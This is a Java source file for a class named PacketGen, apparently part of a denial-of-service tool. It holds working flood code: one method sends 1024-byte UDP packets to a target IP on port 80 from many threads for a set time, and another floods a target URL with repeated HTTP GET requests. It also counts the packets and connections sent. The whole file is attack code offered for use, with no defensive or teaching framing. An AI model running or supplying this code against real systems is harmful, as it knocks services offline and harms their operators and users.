package syn.net;

import java.io.IOException;
import java.math.BigInteger;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.SocketException;
import java.net.URL;
import java.net.UnknownHostException;

import syn.main.Utilities;

public class PacketGen {
	
	private int cores;
	private Thread[] threads;
	private DatagramSocket socket;
	private InetAddress target;
	private byte[] data;
	private int upacketCount;
	private int hconnCount;
	private Utilities uc;
	
	public static boolean errorSent = false;
	
	public PacketGen() {
		data = new byte[1024];
		cores = Runtime.getRuntime().availableProcessors();
		threads = new Thread[cores * 2];
		uc = new Utilities();
	}

	public void udp(String ip, int time) throws UnknownHostException, SocketException {
		upacketCount = 0;
		final long ttime = (time * 1000) + System.currentTimeMillis();
		target = InetAddress.getByName(ip);
		socket = new DatagramSocket();
		for(int x = 0; x < threads.length; x++) {
			threads[x] = new Thread(){
				public void run(){
					while(System.currentTimeMillis() <= ttime){
						try {
							DatagramPacket packet = new DatagramPacket(data, data.length, target, 80);
							socket.send(packet);
							upacketCount++;
						} catch (Exception e) {}
					}
				}
			};
			threads[x].start();
		}
	}
	
	public void http(final String ip, int time, final int delay) throws UnknownHostException {
		hconnCount = 0;
		final long ttime = (time * 1000) + System.currentTimeMillis();
		for(int x = 0; x < threads.length; x++) {
			threads[x] = new Thread() {
				public void run() {
					while(System.currentTimeMillis() <= ttime) {
						try {
							HttpURLConnection.setFollowRedirects(false);
							HttpURLConnection conn = (HttpURLConnection) (new URL(ip)).openConnection();
							conn.setRequestMethod("GET");
							conn.getResponseCode();
							conn = null;
							hconnCount++;
						} catch(Exception e) { 
							if(e instanceof MalformedURLException) { 
								try {
									if(!errorSent) {
										errorSent = true;
										uc.write("No HTTP prefix.");
									}
								} catch (IOException e1) {
									e1.printStackTrace();
								} 
							} 
						} finally { 
							try {
								Thread.sleep(delay);
							} catch(InterruptedException ie) {
								ie.printStackTrace();
							}
						}
					}
				}
			};
			threads[x].start();
		}
	}
	
	public int getUPacketCount() {
		boolean done = false;
		while(!done) {
			if(!threads[threads.length - 1].isAlive()) {
				done = true;
			}
		}
		return upacketCount;
	}
	
	public BigInteger getLoad() {
		return BigInteger.valueOf((data.length * getUPacketCount()) / 1000);
	}
	
	public int getHConnCount() {
		boolean done = false;
		while(!done) {
			if(!threads[threads.length - 1].isAlive()) {
				done = true;
			}
		}
		return hconnCount;
	}
}
